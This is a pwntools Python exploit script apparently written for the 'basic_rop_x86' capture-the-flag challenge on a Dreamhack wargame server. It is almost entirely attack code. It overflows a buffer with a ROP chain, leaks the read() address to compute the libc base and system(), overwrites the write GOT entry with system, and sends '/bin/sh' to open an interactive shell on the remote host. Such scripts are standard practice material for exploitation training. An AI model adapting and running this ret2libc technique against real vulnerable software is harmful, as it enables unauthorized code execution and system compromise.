from pwn import *

context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h'] 

# --------------------- BINARY ACCESS ---------------------- 

# LOCAL
#p = process('./basic_rop_x86')

# LOCAL DEBUGGING ONLY
#gdb.attach(p, 'b *(main+72)')
#pause()

# REMOTE
p = remote('host3.dreamhack.games', 19514)

# -------------- BINARY INFORMATION GATHERING -------------- 

# COMMON
e = ELF('./basic_rop_x86')
rop = ROP(e)

# LOCAL
#libc = e.libc

# REMOTE
libc = ELF('./libc.so.6')


# ------------------ BINARY EXPLOITATION ------------------- 
'''
READ_PLT = p32(e.plt['read'])
READ_GOT = p32(e.got['read'])
WRITE_PLT = p32(e.plt['write'])
WRITE_GOT = p32(e.got['write'])
PPP_RET = p32((rop.find_gadget(['add esp, 8', 'pop ebx', 'ret']))[0])
POP_RET = p32((rop.find_gadget(['pop ebx', 'ret']))[0])

print("[+] read plt addr : " + hex(u32(READ_PLT)))
print("[+] read got addr : " + hex(u32(READ_GOT)))
print("[+] write plt addr : " + hex(u32(WRITE_PLT)))
print("[+] write got addr : " + hex(u32(WRITE_GOT)))
print("[+] POP_RET addr : " + hex(u32(POP_RET)))
print("[+] PPP_RET addr : " + hex(u32(PPP_RET)))
'''

PAYLOAD_DUMMY = b'\x90' * 0x40

rop.write(1, e.got['read'], 4)
rop.read(0, e.bss(), 8)
rop.read(0, e.got['write'], 4)
rop.write(e.bss())

PAYLOAD = PAYLOAD_DUMMY + b'\x90' * 0x8 + rop.chain()

p.send(PAYLOAD)
sleep(1)

p.recvuntil(PAYLOAD_DUMMY)

READ = u32(p.recvn(4))

print('[+] Address of READ : ' + hex(READ))
print('[+] Offset of SYSTEM : ' + hex(libc.symbols["system"]))

LIBC_BASE = READ - libc.symbols["read"]
SYSTEM = LIBC_BASE + libc.symbols["system"]

print('[+] LIBC_BASE : ' + hex(LIBC_BASE))
print('[+] SYSTEM : ' + hex(SYSTEM))

print(rop.dump())

p.send(b'/bin/sh\x00' + p32(SYSTEM))
sleep(1)

p.interactive()
